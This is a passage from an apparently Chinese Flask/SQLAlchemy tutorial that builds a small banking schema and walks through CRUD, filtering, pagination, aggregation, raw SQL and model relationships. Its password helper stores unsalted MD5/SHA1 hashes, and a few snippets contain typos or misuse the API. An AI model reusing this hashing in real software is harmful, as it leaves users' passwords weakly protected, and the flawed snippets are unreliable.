class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Bank</span>(db.Model):</span><br><span class=\"line\">\t<span class=\"built_in\">id</span> = db.Column(db.Integer, primary_key=<span class=\"literal\">True</span>, autoincrement=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    name = db.Column(db.String(<span class=\"number\">31</span>), unique=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    address = db.Column(db.String(<span class=\"number\">1023</span>), nullable=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n\n<p>1.3 声明银行卡模型</p>\n<p>1.4 声明交易模型</p>\n</li>\n<li><p>更新所有查询列表页面</p>\n<p>2.1. 在用户的list2路由的处理函数中使用User模型类</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> models <span class=\"keyword\">import</span> User</span><br><span class=\"line\">   data = &#123;</span><br><span class=\"line\">       <span class=\"string\">&#x27;users&#x27;</span>: User.query.<span class=\"built_in\">all</span>(),</span><br><span class=\"line\">       <span class=\"string\">&#x27;session&#x27;</span>: session</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>User.query.all()从数据库中查询所有的用户信息。</p>\n</li>\n</ol>\n<h2 id=\"三、SQLAlchemy的CURD\"><a href=\"#三、SQLAlchemy的CURD\" class=\"headerlink\" title=\"三、SQLAlchemy的CURD\"></a>三、SQLAlchemy的CURD</h2><h3 id=\"3-1-模型创建数据-Create\"><a href=\"#3-1-模型创建数据-Create\" class=\"headerlink\" title=\"3.1 模型创建数据(Create)\"></a>3.1 模型创建数据(Create)</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_create</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\"></span><br><span class=\"line\">    user = User(name=<span class=\"string\">&#x27;lixiaolong&#x27;</span>, number=<span class=\"string\">&#x27;546656546546&#x27;</span>, phone=<span class=\"string\">&#x27;5566645656&#x27;</span>, password=crypt.pwd(<span class=\"string\">&#x27;333333&#x27;</span>))</span><br><span class=\"line\">    db.session.add(user)</span><br><span class=\"line\">    db.session.commit()  <span class=\"comment\"># 提交事务</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-模型更新数据（Update）\"><a href=\"#3-2-模型更新数据（Update）\" class=\"headerlink\" title=\"3.2 模型更新数据（Update）\"></a>3.2 模型更新数据（Update）</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_update</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">    user = User.query.get(<span class=\"number\">11</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(user)</span><br><span class=\"line\"></span><br><span class=\"line\">    user.phone = <span class=\"string\">&#x27;121&#x27;</span></span><br><span class=\"line\">    user.name = <span class=\"string\">&#x27;gaoxinyiyuan&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    db.session.add(user)</span><br><span class=\"line\">    db.session.commit()  <span class=\"comment\"># 自动检测数据是否发生变化</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-3-模型删除数据（Delete）\"><a href=\"#3-3-模型删除数据（Delete）\" class=\"headerlink\" title=\"3.3 模型删除数据（Delete）\"></a>3.3 模型删除数据（Delete）</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_delete</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">    db.session.delete(User.query.get(<span class=\"number\">11</span>))</span><br><span class=\"line\">    db.session.commit()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-4-模型读取数据（Read）\"><a href=\"#3-4-模型读取数据（Read）\" class=\"headerlink\" title=\"3.4 模型读取数据（Read）\"></a>3.4 模型读取数据（Read）</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_filter</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询所有姓名中包含“e”字的用户</span></span><br><span class=\"line\">    <span class=\"comment\"># for u in User.query.filter(User.name.contains(&#x27;x&#x27;)):</span></span><br><span class=\"line\">    <span class=\"comment\">#     print(u)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询所有“x”开头的用户</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> User.query.<span class=\"built_in\">filter</span>(User.name.startswith(<span class=\"string\">&#x27;x&#x27;</span>)):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(u)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> User.query.<span class=\"built_in\">filter</span>(User.name == <span class=\"string\">&#x27;cheng&#x27;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(u)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 从查询结果中读取一条记录</span></span><br><span class=\"line\">    u = User.query.<span class=\"built_in\">filter</span>(User.number == <span class=\"string\">&#x27;666666666666666666&#x27;</span>).one()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(u)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">filter</span> = User.query.<span class=\"built_in\">filter</span>(User.name == <span class=\"string\">&#x27;cheng&#x27;</span>, User.password == crypt.pwd(<span class=\"string\">&quot;000000&quot;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        login_user = <span class=\"built_in\">filter</span>.one()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(login_user)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;账号或口令错误&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>crypt.pwd()函数的定义如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwd</span>(<span class=\"params\">txt, hash_name=<span class=\"string\">&#x27;md5&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"comment\"># 重命名的快捷键：shift+F6</span></span><br><span class=\"line\">    hash_ = hashlib.md5() <span class=\"keyword\">if</span> hash_name == <span class=\"string\">&#x27;md5&#x27;</span> <span class=\"keyword\">else</span> hashlib.sha1()</span><br><span class=\"line\">    hash_.update(txt.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash_.hexdigest()</span><br><span class=\"line\">    <span class=\"comment\"># return hashlib.md5(txt.encode(&#x27;utf-8&#x27;)).hexdigest()</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_filter_or_not</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询编号不小于9的，或者是银行名包含“业”字</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> bank <span class=\"keyword\">in</span> Bank.query.<span class=\"built_in\">filter</span>(db.or_(</span><br><span class=\"line\">        Bank.<span class=\"built_in\">id</span> &gt;= <span class=\"number\">9</span>,</span><br><span class=\"line\">        Bank.name.like(<span class=\"string\">&#x27;%业%&#x27;</span>)</span><br><span class=\"line\">    )):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(bank.<span class=\"built_in\">id</span>, bank.name, bank.address)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询非‘西安’的银行</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> bank <span class=\"keyword\">in</span> Bank.query.<span class=\"built_in\">filter</span>(db.not_(Bank.name.contains(<span class=\"string\">&#x27;西安&#x27;</span>))):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(bank.<span class=\"built_in\">id</span>, bank.name, bank.address)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_filter_func</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">    <span class=\"comment\"># __ge__()相当于&gt;=</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> card <span class=\"keyword\">in</span> Card.query.<span class=\"built_in\">filter</span>(Card.money.__ge__(<span class=\"number\">5000</span>)):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(card.number, card.money)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-4-1-session的查询\"><a href=\"#3-4-1-session的查询\" class=\"headerlink\" title=\"3.4.1 session的查询\"></a>3.4.1 session的查询</h4><p>query()方法中指定的是查询的字段信息，filter()指定的是条件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.session.query(User.number, User.phone).<span class=\"built_in\">filter</span>(user.name.like(<span class=\"string\">&#x27;%i%&#x27;</span>)).<span class=\"built_in\">all</span>()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">db.session.query(User.number, User.phone).first() <span class=\"comment\">#查看第一条</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>针对query()查询结构集可以使用first()也可以使用all()及get(id)。</strong></p>\n<p><strong>针对filter()查询结果集可以使用one()，all()</strong></p>\n<h4 id=\"3-4-2-模型类的查询\"><a href=\"#3-4-2-模型类的查询\" class=\"headerlink\" title=\"3.4.2 模型类的查询\"></a>3.4.2 模型类的查询</h4><p>模型类可以直接发起查询，默认情况查询模型下的所有字段。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">User.query.<span class=\"built_in\">filter</span>(name=<span class=\"string\">&#x27;disen&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># User.query(User.name, User.phone).all() #模型的query是不能被调用的</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-4-3-模型字段查询条件\"><a href=\"#3-4-3-模型字段查询条件\" class=\"headerlink\" title=\"3.4.3 模型字段查询条件\"></a>3.4.3 模型字段查询条件</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">== 等值查询\t\t!= 不相等\t\t&gt;= 或__ge__() 大于等于\t\t&lt;= 或__le__() 小于等于</span><br><span class=\"line\">in_((1,)) 包含\t\tlike() 模糊匹配 \t\tstartswith() 字符串开头匹配</span><br><span class=\"line\">endswith() 字符串结尾匹配\t\tcontains() 字符串包含匹配</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-4-4-排序与分页\"><a href=\"#3-4-4-排序与分页\" class=\"headerlink\" title=\"3.4.4 排序与分页\"></a>3.4.4 排序与分页</h4><p>排序：order_by()，可以在query和filter之后使用order_by。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_model_order_page</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 按身份证号排序</span></span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">    <span class=\"comment\"># 先按姓名排序，姓名相同时，再按身份证号排序</span></span><br><span class=\"line\">    <span class=\"comment\"># 默认按升序ASC-&gt; asc()，可以指定降序DESC-&gt; desc()</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> User.query.order_by(User.name, User.number.desc()).<span class=\"built_in\">all</span>():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(u.number, u.name, u.phone)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--&#x27;</span>*<span class=\"number\">20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> User.query.<span class=\"built_in\">filter</span>(User.name.startswith(<span class=\"string\">&#x27;x&#x27;</span>)).order_by(User.phone.desc()).<span class=\"built_in\">all</span>():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(u.name, u.phone, u.number)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查询银行卡的余额，按余额的降序排序</span></span><br><span class=\"line\">       <span class=\"keyword\">for</span> card <span class=\"keyword\">in</span> db.session.query(Card).order_by(Card.money.desc()).<span class=\"built_in\">all</span>():</span><br><span class=\"line\">           <span class=\"built_in\">print</span>(card.number, card.money)</span><br></pre></td></tr></table></figure>\n\n<p>分页：offset()，limit()</p>\n<p>如果分页函数与order_by组合使用时，必须放在order_by之后。分页函数可以用在query和filter之后。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>) <span class=\"keyword\">AS</span> count_1 </span><br><span class=\"line\"><span class=\"keyword\">FROM</span> (</span><br><span class=\"line\">\t<span class=\"keyword\">SELECT</span> user.id <span class=\"keyword\">AS</span> user_id, user.number <span class=\"keyword\">AS</span> user_number, user.name <span class=\"keyword\">AS</span> user_name, user.phone <span class=\"keyword\">AS</span> user_phone, user.password <span class=\"keyword\">AS</span> user_password </span><br><span class=\"line\">\t<span class=\"keyword\">FROM</span> <span class=\"keyword\">user</span> </span><br><span class=\"line\"> <span class=\"keyword\">WHERE</span> (user.phone <span class=\"keyword\">LIKE</span> concat(<span class=\"operator\">%</span>(phone_1)s, <span class=\"string\">&#x27;%%&#x27;</span>)) </span><br><span class=\"line\"> <span class=\"keyword\">OR</span> (user.phone <span class=\"keyword\">LIKE</span> concat(<span class=\"operator\">%</span>(phone_2)s, <span class=\"string\">&#x27;%%&#x27;</span>)) </span><br><span class=\"line\"> <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> user.phone) <span class=\"keyword\">AS</span> anon_1</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_page</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询以“1”或“2”开头手机号的用户信息</span></span><br><span class=\"line\">    <span class=\"comment\"># 先按手机号排序，再分页</span></span><br><span class=\"line\">    query_set = User.query.<span class=\"built_in\">filter</span>(db.or_(User.phone.startswith(<span class=\"string\">&#x27;1&#x27;</span>),</span><br><span class=\"line\">                                      User.phone.startswith(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    )).order_by(User.phone);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> self.page_data(query_set, page=<span class=\"number\">2</span>).<span class=\"built_in\">all</span>():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(u.name, u.phone)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">page_data</span>(<span class=\"params\">self, query_set, page_size=<span class=\"number\">3</span>, page=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">    total = query_set.count()</span><br><span class=\"line\">    pages = total // page_size + ( <span class=\"number\">1</span> <span class=\"keyword\">if</span> total % page_size &gt; <span class=\"number\">0</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;总条数：%s, 每页显示%s条，总页数：%s&#x27;</span> % (total, page_size, pages))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> page &gt; pages:</span><br><span class=\"line\">        page = pages</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> page &lt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">        page = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;----------------------显示第%s页-------------------------------&#x27;</span> % page)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> query_set.offset((page-<span class=\"number\">1</span>)*page_size).limit(page_size)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务-Flask第五天\"><a href=\"#WEB后端服务-Flask第五天\" class=\"headerlink\" title=\"WEB后端服务-Flask第五天\"></a>WEB后端服务-Flask第五天</h1><h2 id=\"一、聚合查询\"><a href=\"#一、聚合查询\" class=\"headerlink\" title=\"一、聚合查询\"></a>一、聚合查询</h2><p>SQLAlchemy支持聚合查询，使用db.session.query()查询和db.func.聚合函数()。</p>\n<p>常用的聚合查询函数：</p>\n<ul>\n<li><p>db.dunc.count(模型类的字段) 统计</p>\n</li>\n<li><p>db.func.sum() 求和</p>\n</li>\n<li><p>db.func.min() 最小值</p>\n</li>\n<li><p>db.func.max() 最大值</p>\n</li>\n<li><p>db.func.avg() 平均值</p>\n<p>以上的聚合函数与mysql中聚合函数一一对应。可以在聚合函数后面使用.label()设置别名。</p>\n<p>另外，聚合函数中使用模型类字段必须出现在.group_by()函数中。当然也可以在group_by()之后使用having()设置聚合字段结果的条件，如总财富不少于多少钱，总人数不少于多少人等。在having()中可以使用.label()设定的别名。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_sum_money</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># 查询每个人的财富</span></span><br><span class=\"line\">    result = db.session.query(Card.user_id, db.func.<span class=\"built_in\">sum</span>(Card.money).label(<span class=\"string\">&#x27;total&#x27;</span>)</span><br><span class=\"line\">                              ).group_by(Card.user_id).having(db.func.<span class=\"built_in\">sum</span>(Card.money) &gt; <span class=\"number\">20000</span></span><br><span class=\"line\">                                                              ).order_by(db.Column(<span class=\"string\">&#x27;total&#x27;</span>).desc()).<span class=\"built_in\">all</span>()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">type</span>(result))  <span class=\"comment\"># list[(user_id, total), ..]</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># 二次查询</span></span><br><span class=\"line\">    user_totals = [ (User.query.get(user_id), money) <span class=\"keyword\">for</span> user_id, money <span class=\"keyword\">in</span> result]</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">for</span> user, money <span class=\"keyword\">in</span> user_totals:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(user.name, user.phone, money)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_bank_money</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 防止出现异常：no application found</span></span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># db.session.query() 查询结果是list[(id,name)]</span></span><br><span class=\"line\">    <span class=\"comment\"># result = db.session.query(User.id, User.name).all()</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># collections.namedtuple()</span></span><br><span class=\"line\">    <span class=\"comment\"># print(type(result[0])) # &lt;class &#x27;sqlalchemy.engine.row.Row&#x27;&gt;</span></span><br><span class=\"line\">    <span class=\"comment\"># for id, name in result:</span></span><br><span class=\"line\">    <span class=\"comment\">#     # 以模型对象的方式来显示数据</span></span><br><span class=\"line\">    <span class=\"comment\">#     print(id, name)</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># for item in result:</span></span><br><span class=\"line\">    <span class=\"comment\">#     # 以模型对象的方式来显示数据</span></span><br><span class=\"line\">    <span class=\"comment\">#     print(item.id, item.name)</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># db.session.query() 查询结果是list[&lt;User 1&gt;, ...]</span></span><br><span class=\"line\">    <span class=\"comment\"># result = db.session.query(User).all()</span></span><br><span class=\"line\">    <span class=\"comment\"># print(result)</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># 汇总每个银行的开户的人数、总金额和每个银行的最小金额和最大金额银行卡绑定的用户信息</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># 返回结果：list[&lt;sqlalchemy.util._collections.result&gt;] -&gt; collections.namedtuple()</span></span><br><span class=\"line\">    results = db.session.query(Card.bank_id,</span><br><span class=\"line\">                               db.func.<span class=\"built_in\">min</span>(Card.money).label(<span class=\"string\">&#x27;min_&#x27;</span>),</span><br><span class=\"line\">                               db.func.<span class=\"built_in\">max</span>(Card.money).label(<span class=\"string\">&#x27;max_&#x27;</span>),</span><br><span class=\"line\">                               db.func.count(<span class=\"string\">&#x27;*&#x27;</span>).label(<span class=\"string\">&#x27;cnt&#x27;</span>),</span><br><span class=\"line\">                               db.func.<span class=\"built_in\">sum</span>(Card.money).label(<span class=\"string\">&#x27;total&#x27;</span>)</span><br><span class=\"line\">                          \t   ).group_by(Card.bank_id).<span class=\"built_in\">all</span>()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> results:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(Bank.query.get(item.bank_id).name, item.cnt, item.total, item.min_, item.max_)</span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"comment\"># 最小金额的用户信息</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--------------------最小和最大的存款用户信息---------------------&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> user_id, money <span class=\"keyword\">in</span> db.session.query(Card.user_id, Card.money).<span class=\"built_in\">filter</span>(</span><br><span class=\"line\">            Card.bank_id == item.bank_id, db.or_(</span><br><span class=\"line\">                Card.money == item.min_, Card.money == item.max_)).<span class=\"built_in\">all</span>():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(User.query.get(user_id).name, money)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原生SQL查询\"><a href=\"#原生SQL查询\" class=\"headerlink\" title=\"原生SQL查询\"></a>原生SQL查询</h3></li>\n</ul>\n<p>sqlalchemy库支持原生SQL查询，db.session.execute(sql)。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_card_user_bank</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> app.app_context():</span><br><span class=\"line\">        <span class=\"comment\"># 查询用户名、手机号、银行名、银行地址、银行卡及存款</span></span><br><span class=\"line\">        sql = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">            select u.name, u.phone, b.name, b.address, c.number, c.money</span></span><br><span class=\"line\"><span class=\"string\">            from user u</span></span><br><span class=\"line\"><span class=\"string\">            JOIN card c on (u.id = c.user_id)</span></span><br><span class=\"line\"><span class=\"string\">            JOIN bank b on (b.id = c.bank_id)</span></span><br><span class=\"line\"><span class=\"string\">            order by c.money desc</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        exc = db.session.execute(sql)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> username, phone, bankname, address, number, money <span class=\"keyword\">in</span> exc.cursor:</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(username, phone, bankname, address, number, money)</span><br></pre></td></tr></table></figure>\n\n<p>exc.cursor是pymysql.cursor.Cursor类型，而且cursor可以被迭代。</p>\n<p>思考：如何让cursor查询结果是dict对象，而不是现在的元组。</p>\n<h3 id=\"连接查询\"><a href=\"#连接查询\" class=\"headerlink\" title=\"连接查询\"></a>连接查询</h3><ul>\n<li><p>join() 内连接</p>\n</li>\n<li><p>outerjoin() 外连接</p>\n<p>普通的db.session.query()+filter()也可以实现多个实体类进行连接查询</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_user_card</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">    result = db.session.query(User.name, User.phone, Card.money,</span><br><span class=\"line\">                              Bank.name.label(<span class=\"string\">&#x27;bankname&#x27;</span>),</span><br><span class=\"line\">                              Bank.address, Card.money, Card.number</span><br><span class=\"line\">                              ).<span class=\"built_in\">filter</span>(</span><br><span class=\"line\">                              User.<span class=\"built_in\">id</span> == Card.user_id).<span class=\"built_in\">filter</span>(Bank.<span class=\"built_in\">id</span> == Card.bank_id)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> result.<span class=\"built_in\">all</span>():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(item.name, item.phone, item.bankname, item.address, item.number.replace(<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>), item.money)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"总结db-Column-对象的常用方法\"><a href=\"#总结db-Column-对象的常用方法\" class=\"headerlink\" title=\"总结db.Column()对象的常用方法\"></a>总结db.Column()对象的常用方法</h3><ul>\n<li>label()列的别名</li>\n<li>desc() / asc()排序</li>\n<li>条件方法<ul>\n<li>startswith()    endswith()    like()    contains()    _<em>le()</em>_    _<em>ge()</em>_    lt()    gt()    eq()    isnot()    in_()    notin_()</li>\n</ul>\n</li>\n</ul>\n<p>flask.pocoo.org/docs/  官方文档。</p>\n<p><a href=\"https://www.sqlalchemy.org/\">https://www.sqlalchemy.org/</a> 官方文档。</p>\n</li>\n</ul>\n<h2 id=\"二、SQLAlchemy的模型关系与反向引用\"><a href=\"#二、SQLAlchemy的模型关系与反向引用\" class=\"headerlink\" title=\"二、SQLAlchemy的模型关系与反向引用\"></a>二、SQLAlchemy的模型关系与反向引用</h2><p>模型关系分四种：</p>\n<ul>\n<li>一对一关系</li>\n<li>一对多关系</li>\n<li>多对一关系</li>\n<li>多对多关系</li>\n</ul>\n<p>配置用户、银行和银行卡的关联关系：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Card</span>(db.Model):</span><br><span class=\"line\">    <span class=\"built_in\">id</span> = db.Column(db.Integer, primary_key=<span class=\"literal\">True</span>, autoincrement=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    number = db.Column(db.String(<span class=\"number\">20</span>), unique=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    money = db.Column(db.Float(<span class=\"number\">2</span>), default=<span class=\"number\">0</span>, server_default=<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">    password = db.Column(db.String(<span class=\"number\">100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 模型的关系维护（建立）在多端</span></span><br><span class=\"line\">    user_id = db.Column(db.Integer, db.ForeignKey(<span class=\"string\">&#x27;user.id&#x27;</span>))</span><br><span class=\"line\">    user = db.relationship(User, backref=<span class=\"string\">&#x27;cards&#x27;</span>) <span class=\"comment\"># backref反向链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">    bank_id = db.Column(db.Integer, db.ForeignKey(<span class=\"string\">&#x27;bank.id&#x27;</span>))</span><br><span class=\"line\">    bank = db.relationship(Bank, backref=<span class=\"string\">&#x27;cards&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>两个模型类之间建立关系，必须存在一个外键约束。</p>\n<p>单元测试：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestRelationship</span>(<span class=\"title class_ inherited__\">TestCase</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_1</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        app.app_context().push()</span><br><span class=\"line\">        user = User.query.get(<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(user.name)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> card <span class=\"keyword\">in</span> user.cards:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(card.bank.name, card.number, card.money)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_2</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">    app.app_context().push()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> card <span class=\"keyword\">in</span> Card.query.<span class=\"built_in\">all</span>():</span><br><span class=\"line\">        <span class=\"comment\"># 显示用户名、用户的手机号、银行名，存款</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(card.user.name, card.user.phone, card.bank.name, card.money)</span><br></pre></td></tr></table></figure>\n\n<p>关于relationship的用法（自关联）：<a 